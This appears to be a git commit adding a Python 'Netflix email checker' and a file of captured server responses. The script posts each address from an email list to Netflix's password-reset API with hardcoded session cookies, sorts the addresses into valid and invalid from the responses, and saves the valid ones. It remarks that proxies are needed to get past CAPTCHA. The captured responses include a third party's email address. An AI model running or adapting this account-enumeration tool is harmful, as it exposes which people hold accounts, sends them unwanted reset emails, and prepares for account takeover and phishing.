998cdbdecbd0f14469e4798b2a4a6995bec674f8
popg <sawdyk123@gnail.com>
2023-09-12 19:40:53 -0400

    1

---
+++ netflix.py
@@ -0,0 +1,96 @@
+import requests, time
+from colorama import init, Fore
+init()
+
+green = Fore.GREEN
+white = Fore.WHITE
+red = Fore.RED
+yellow = Fore.YELLOW
+blue = Fore.BLUE
+
+print()
+print(blue+ '''
+      
+      Coded by Pop(G)
+                    Blackcteam
+      ''')
+print()
+
+url = 'https://www.netflix.com/api/shakti/mre/login/help'
+
+
+
+def netflix(email, name):
+    headers = {
+        'Host': 'www.netflix.com',
+        'Cookie': 'flwssn=640474f3-4b7e-4df0-b23b-00d3d55de38a; nfvdid=BQFmAAEBEEFaRpMucg14B1NjhPhFUPVAWeOd_Zb1BEsvgJtPy7MtIrL_3ir9RvEfW60WdgkIqP04g2Y4qkKoXWEGSWiyZxDAfHCP57qjbcq9cKC7njMa1g%3D%3D; SecureNetflixId=v%3D2%26mac%3DAQEAEQABABQZUA8T8AhMETrAqwZXtu5N-u_dLlWH0cE.%26dt%3D1694557740265; NetflixId=v%3D2%26ct%3DBQAOAAEBEFGebBrXCUAPTRvxG6oxtmiBAJ7apG5zsN6oP99BdGp4ExD66aFHRdMCYdbdVokYk2MDhqdeKrTyjpZS2otZML21F6rq2PAxGAumy0uF03oCfOagUJZQNmZELxpvO8bOVgTE4A1sByvj8PGw_ECo8APxIEMWxyyokSTdCZTcrnteQGmRfIWgwfJ5Ll99aDwgt70-KIbI5vMtkbbPDcOKCDXOxxUqb2WKdRaYMoX5miKKv_U2znExnlJWdvmcPBxO1-65ZrQnsr1Qio4ETTiLWTTURamGPASBlgdSrUKtp5YJjI7wyIaQb36ivgVvZc7nCUkHL5KILk799fkmif1a6gQsf7wXa__0NTCaTzvQRHpnNuA.%26bt%3Ddev%26mac%3DAQEAEAABABTIDgRQOo4JYaXaJOSpzab98-aKseKYYVo.; OptanonConsent=isGpcEnabled=0&datestamp=Tue+Sep+12+2023+18%3A29%3A42+GMT-0400+(Eastern+Daylight+Time)&version=202301.1.0&isIABGlobal=false&hosts=&consentId=cb1b423b-c216-4081-a9ca-515c33dea581&interactionCount=1&landingPath=https%3A%2F%2Fwww.netflix.com%2Fng%2FloginHelp&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1',
+        # Add other headers here
+        'Content-Type': 'application/json',
+        'Accept': 'application/json, text/javascript, */*; q=0.01',
+        'X-Requested-With': 'XMLHttpRequest',
+        'X-Netflix.client.request.name': 'ui/xhrUnclassified',
+        'Origin': 'https://www.netflix.com',
+        'Sec-Fetch-Site': 'same-origin',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Dest': 'empty',
+        'Referer': 'https://www.netflix.com/ng/loginHelp',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'en-US,en;q=0.9'
+    }
+
+    payload = {
+        "fields": {
+            "forgotPasswordChoice": {"value": "email"},
+            "email": email,
+            "recaptchaResponseToken": "",
+            "recaptchaError": "RESPONSE_TIMED_OUT",
+            "recaptchaResponseTime": "2505"
+        },
+        "mode": "enterPasswordReset",
+        "action": "nextAction",
+        "authURL": "1694557779691.4VrMqdMwnS99X7y5vd2NvpRu4cA="
+    }
+
+    # print(response.json())
+    try:
+        response = requests.post(url, headers=headers, json=payload)
+        print(response.text)
+        if response.status_code == 200:
+            if 'account_not_found'  in response.text:
+                print(red + f'Invalid ==> {email}')
+            elif 'recaptchaError' in response.text:
+                print('CAPTCHA ERROR started, proxies needed.. ')
+                
+            elif 'confirmPasswordResetEmailed' in response.text:
+                with open(name, 'a') as valid:
+                    # print(response.text)
+                    print()
+                    valid.write(f'{email}\n')
+                    # save.write(f"{number}\n")
+                    print(green + f'Valid ==> {email}')
+            else: 
+                print('Unknown error ...')
+                
+            # else:
+        else:
+            print('Server please notify the Provider')
+    except Exception as e:
+        print(e)
+# netflix('sawdyk123@gmail.com')
+
+def run():
+    try:
+        file = input(yellow + "Enter path to netflix email list: ")
+        save_name = input(yellow + "Enter name to save the result: ")
+        with open(file, 'r') as read:
+            emails = read.readlines()
+            for email in emails:
+                email = email.strip()
+                netflix(email, save_name)
+    except KeyboardInterrupt:
+        print()
+        print()
+        print(red + "Thank for you time....")
+        time.sleep(1)
+    
+run()
---
+++ tt.py
@@ -0,0 +1,82 @@
+#1
+'''HTTP/2 200 OK
+X-Robots-Tag: noindex, nofollow
+X-Frame-Options: DENY
+X-Debug-Tz: PST
+X-Netflix.request.toplevel.uuid: 7e08d61e-2282-42e6-b887-2560071d9b5e-58708662
+X-Netflix.execution-Time: 42
+Content-Type: application/json;charset=UTF-8
+Date: Tue, 12 Sep 2023 23:08:34 GMT
+Via: 2 i-0cba2a1a46f29c808 (eu-west-1)
+Server: api-prod-website i-08b43f52a08ac99a1
+X-Xss-Protection: 1; mode=block; report=https://www.netflix.com/ichnaea/log/freeform/xssreport
+X-Content-Type-Options: nosniff
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Headers: Authorization,Content-Type,Content-Encoding,Accept,X-Netflix.application.name,X-Netflix.application.version,X-Netflix.esn,X-Netflix.device.type,X-Netflix.certification.version,X-Netflix.request.uuid,X-Netflix.originating.request.uuid,X-Netflix.user.id,X-Netflix.oauth.consumer.key,X-Netflix.oauth.token,X-Netflix.ichnaea.request.type,X-Netflix.Request.Routing,X-NETFLIX-PREAPP-PARTNER-ID, X-NETFLIX-PREAPP-INTEGRITY-VALUE, X-Netflix.Request.Priority,X-Netflix.Retry.Client.Policy,X-Netflix.Client.Request.Name,X-Netflix.Request.Retry.Policy,X-Netflix.Request.Retry.Policy.Default,X-Netflix.request.client.user.guid,X-Netflix.Request.NonJson.Headers,X-Netflix.esnPrefix,X-Netflix.browserName,X-Netflix.browserVersion,X-Netflix.osName,X-Netflix.osVersion,X-Netflix.uiVersion,X-Netflix.clientType,X-NETFLIX-PERSONALIZATION-ID,X-NETFLIX-DET-TOKEN,X-NETFLIX-DET-PARTNER-PAI,X-NETFLIX-RESPONSE-OVERRIDDEN,X-NETFLIX-DET-DEPRECATION,X-Netflix.context.locales,X-Netflix.context.ui-flavor,X-Netflix.context.app-version,X-Netflix.context.schema-variant,X-Netflix.Request.toplevel.uuid,f9hi42t,x-session
+Access-Control-Expose-Headers: X-Netflix.Retry.Server.Policy,X-Netflix.Response.Tag,X-Netflix.Geo.Info,X-Netflix.request.inbound.identity.changed,Via,X-Netflix.Retry.Server.Policy.retryAfterSeconds,X-Netflix.Retry.Server.Policy.maxRetries,X-Ftl-Error,X-Netflix.uiVersion
+Access-Control-Allow-Methods: GET, POST
+Access-Control-Allow-Origin: https://www.netflix.com
+X-Originating-Url: http://www.netflix.com/api/shakti/mre/login/help
+X-Netflix.nfstatus: 1_1
+X-Netflix.proxy.execution-Time: 46
+X-Netflix.zuul.netty.content.compressor.target: gzip
+#1
+{"codeName":"S-Icarus-6.Abe-3","mode":"enterPasswordReset","flwssn":"640474f3-4b7e-4df0-b23b-00d3d55de38a","netflixClientPlatform":null,"flow":"websiteSignUp","edgeFields":null,"fields":{"csWebsiteUrl":{"fieldType":"String","value":"http://help.netflix.com"},"csPhoneNumber":{"fieldType":"String","value":"1-844-505-2993"},"signInAction":{"fieldType":"Action"},"recaptchaSitekey":{"fieldType":"String","value":"6LeDeyYaAAAAABFLwg58qHaXTEuhbrbUq8nDvOCp"},"recaptchaResponseToken":{"fieldType":"String"},"recaptchaError":{"hidden":true,"required":false,"fieldType":"String"},"recaptchaResponseTime":{"hidden":true,"required":false,"fieldType":"Numeric"},"forgotPasswordChoice":{"fieldType":"Choice","value":"email","options":[{"value":"email","fields":{"email":{"fieldType":"String","value":"sawdyk123@gmail.com","maxLength":50,"minLength":5,"validationRegex":"^[^\\s<>\"\\\\;:]+@[a-zA-Z0-9.\\-_]+\\.[a-zA-Z0-9-_]+$"},"nextAction":{"fieldType":"Action","withFields":["recaptchaResponseToken","recaptchaError","recaptchaResponseTime","forgotPasswordChoice","email"]}}},{"value":"text","fields":{"phoneNumber":{"fieldType":"String","maxLength":15,"minLength":5,"validationRegex":"^\\+?[0-9-(). ]+$"},"countryCode":{"fieldType":"String","maxLength":2,"minLength":2,"validationRegex":"^[A-Z]+$"},"nextAction":{"fieldType":"Action","withFields":["recaptchaResponseToken","recaptchaError","recaptchaResponseTime","forgotPasswordChoice","phoneNumber","countryCode"]}}}]},"forgotPasswordAlternateAction":{"fieldType":"Action"},"abAllocations":[],"nullHint":{"fieldType":"String","value":"account_not_found","localize":true},"errorCode":{"fieldType":"String","value":"account_not_found"},"moneyballSessionUuid":{"hidden":true,"readOnly":true,"fieldType":"String","value":"9edc26f0-f11c-429e-8673-50ebb3a2c4b6"}},"debugFields":{}}
+'''
+
+
+#2
+'''HTTP/2 200 OK
+X-Robots-Tag: noindex, nofollow
+X-Frame-Options: DENY
+X-Debug-Tz: GMT+1
+X-Netflix.request.toplevel.uuid: 27c241db-643c-4ecc-aee8-9fec47c36e68-27819947
+X-Netflix.execution-Time: 30
+Content-Type: application/json;charset=UTF-8
+Date: Tue, 12 Sep 2023 23:26:08 GMT
+Via: 2 i-0bb67dbad06eea480 (eu-west-1)
+Server: api-prod-website i-04d66dc93b627c4a2
+X-Xss-Protection: 1; mode=block; report=https://www.netflix.com/ichnaea/log/freeform/xssreport
+X-Content-Type-Options: nosniff
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Headers: Authorization,Content-Type,Content-Encoding,Accept,X-Netflix.application.name,X-Netflix.application.version,X-Netflix.esn,X-Netflix.device.type,X-Netflix.certification.version,X-Netflix.request.uuid,X-Netflix.originating.request.uuid,X-Netflix.user.id,X-Netflix.oauth.consumer.key,X-Netflix.oauth.token,X-Netflix.ichnaea.request.type,X-Netflix.Request.Routing,X-NETFLIX-PREAPP-PARTNER-ID, X-NETFLIX-PREAPP-INTEGRITY-VALUE, X-Netflix.Request.Priority,X-Netflix.Retry.Client.Policy,X-Netflix.Client.Request.Name,X-Netflix.Request.Retry.Policy,X-Netflix.Request.Retry.Policy.Default,X-Netflix.request.client.user.guid,X-Netflix.Request.NonJson.Headers,X-Netflix.esnPrefix,X-Netflix.browserName,X-Netflix.browserVersion,X-Netflix.osName,X-Netflix.osVersion,X-Netflix.uiVersion,X-Netflix.clientType,X-NETFLIX-PERSONALIZATION-ID,X-NETFLIX-DET-TOKEN,X-NETFLIX-DET-PARTNER-PAI,X-NETFLIX-RESPONSE-OVERRIDDEN,X-NETFLIX-DET-DEPRECATION,X-Netflix.context.locales,X-Netflix.context.ui-flavor,X-Netflix.context.app-version,X-Netflix.context.schema-variant,X-Netflix.Request.toplevel.uuid,f9hi42t,x-session
+Access-Control-Expose-Headers: X-Netflix.Retry.Server.Policy,X-Netflix.Response.Tag,X-Netflix.Geo.Info,X-Netflix.request.inbound.identity.changed,Via,X-Netflix.Retry.Server.Policy.retryAfterSeconds,X-Netflix.Retry.Server.Policy.maxRetries,X-Ftl-Error,X-Netflix.uiVersion
+Access-Control-Allow-Methods: GET, POST
+Access-Control-Allow-Origin: https://www.netflix.com
+X-Originating-Url: http://www.netflix.com/api/shakti/mre/login/help
+X-Netflix.nfstatus: 1_1
+X-Netflix.proxy.execution-Time: 33
+X-Netflix.zuul.netty.content.compressor.target: gzip
+#2
+{"codeName":"S-Icarus-6.Abe-3","mode":"enterPasswordReset","flwssn":"640474f3-4b7e-4df0-b23b-00d3d55de38a","netflixClientPlatform":null,"flow":"websiteSignUp","edgeFields":null,"fields":{"csWebsiteUrl":{"fieldType":"String","value":"http://help.netflix.com"},"csPhoneNumber":{"fieldType":"String"},"csContactUsUrl":{"fieldType":"String","value":"https://help.netflix.com/contactus"},"signInAction":{"fieldType":"Action"},"recaptchaSitekey":{"fieldType":"String","value":"6LeDeyYaAAAAABFLwg58qHaXTEuhbrbUq8nDvOCp"},"recaptchaResponseToken":{"fieldType":"String"},"recaptchaError":{"hidden":true,"required":false,"fieldType":"String"},"recaptchaResponseTime":{"hidden":true,"required":false,"fieldType":"Numeric"},"forgotPasswordChoice":{"fieldType":"Choice","value":"email","options":[{"value":"email","fields":{"email":{"fieldType":"String","value":"paruldev6390@gmail.com","maxLength":50,"minLength":5,"validationRegex":"^[^\\s<>\"\\\\;:]+@[a-zA-Z0-9.\\-_]+\\.[a-zA-Z0-9-_]+$"},"nextAction":{"fieldType":"Action","withFields":["recaptchaResponseToken","recaptchaError","recaptchaResponseTime","forgotPasswordChoice","email"]}}},{"value":"text","fields":{"phoneNumber":{"fieldType":"String","maxLength":15,"minLength":5,"validationRegex":"^\\+?[0-9-(). ]+$"},"countryCode":{"fieldType":"String","maxLength":2,"minLength":2,"validationRegex":"^[A-Z]+$"},"nextAction":{"fieldType":"Action","withFields":["recaptchaResponseToken","recaptchaError","recaptchaResponseTime","forgotPasswordChoice","phoneNumber","countryCode"]}}}]},"forgotPasswordAlternateAction":{"fieldType":"Action"},"abAllocations":[],"errorCode":{"fieldType":"String","value":"throttling_failure"},"moneyballSessionUuid":{"hidden":true,"readOnly":true,"fieldType":"String","value":"9edc26f0-f11c-429e-8673-50ebb3a2c4b6"}},"debugFields":{}}
+'''
+
+
+#confirmed pass
+'''HTTP/2 200 OK
+X-Robots-Tag: noindex, nofollow
+X-Frame-Options: DENY
+X-Debug-Tz: GMT+1
+X-Netflix.request.toplevel.uuid: f30e37fe-eb52-4437-a5c0-26591575755d-191119794
+X-Netflix.execution-Time: 267
+Content-Type: application/json;charset=UTF-8
+Content-Length: 709
+Date: Tue, 12 Sep 2023 23:33:42 GMT
+Via: 2 i-0e0acbe779931b4f0 (eu-west-1)
+Server: api-prod-website i-018983a03ea598b70
+X-Xss-Protection: 1; mode=block; report=https://www.netflix.com/ichnaea/log/freeform/xssreport
+X-Content-Type-Options: nosniff
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Headers: Authorization,Content-Type,Content-Encoding,Accept,X-Netflix.application.name,X-Netflix.application.version,X-Netflix.esn,X-Netflix.device.type,X-Netflix.certification.version,X-Netflix.request.uuid,X-Netflix.originating.request.uuid,X-Netflix.user.id,X-Netflix.oauth.consumer.key,X-Netflix.oauth.token,X-Netflix.ichnaea.request.type,X-Netflix.Request.Routing,X-NETFLIX-PREAPP-PARTNER-ID, X-NETFLIX-PREAPP-INTEGRITY-VALUE, X-Netflix.Request.Priority,X-Netflix.Retry.Client.Policy,X-Netflix.Client.Request.Name,X-Netflix.Request.Retry.Policy,X-Netflix.Request.Retry.Policy.Default,X-Netflix.request.client.user.guid,X-Netflix.Request.NonJson.Headers,X-Netflix.esnPrefix,X-Netflix.browserName,X-Netflix.browserVersion,X-Netflix.osName,X-Netflix.osVersion,X-Netflix.uiVersion,X-Netflix.clientType,X-NETFLIX-PERSONALIZATION-ID,X-NETFLIX-DET-TOKEN,X-NETFLIX-DET-PARTNER-PAI,X-NETFLIX-RESPONSE-OVERRIDDEN,X-NETFLIX-DET-DEPRECATION,X-Netflix.context.locales,X-Netflix.context.ui-flavor,X-Netflix.context.app-version,X-Netflix.context.schema-variant,X-Netflix.Request.toplevel.uuid,f9hi42t,x-session
+Access-Control-Expose-Headers: X-Netflix.Retry.Server.Policy,X-Netflix.Response.Tag,X-Netflix.Geo.Info,X-Netflix.request.inbound.identity.changed,Via,X-Netflix.Retry.Server.Policy.retryAfterSeconds,X-Netflix.Retry.Server.Policy.maxRetries,X-Ftl-Error,X-Netflix.uiVersion
+Access-Control-Allow-Methods: GET, POST
+Access-Control-Allow-Origin: https://www.netflix.com
+X-Originating-Url: http://www.netflix.com/api/shakti/mre/login/help
+X-Netflix.nfstatus: 1_1
+X-Netflix.proxy.execution-Time: 401
+
+{"codeName":"S-Icarus-6.Abe-3","mode":"confirmPasswordResetEmailed","flwssn":"640474f3-4b7e-4df0-b23b-00d3d55de38a","netflixClientPlatform":null,"flow":"websiteSignUp","edgeFields":null,"fields":{"csWebsiteUrl":{"fieldType":"String","value":"http://help.netflix.com"},"csPhoneNumber":{"fieldType":"String"},"csContactUsUrl":{"fieldType":"String","value":"https://help.netflix.com/contactus"},"signInAction":{"fieldType":"Action"},"email":{"fieldType":"String","value":"paruldev6390@gmail.com"},"hasPhoneNumber":{"fieldType":"Boolean","value":true},"abAllocations":[],"moneyballSessionUuid":{"hidden":true,"readOnly":true,"fieldType":"String","value":"9edc26f0-f11c-429e-8673-50ebb3a2c4b6"}},"debugFields":{}}
+'''
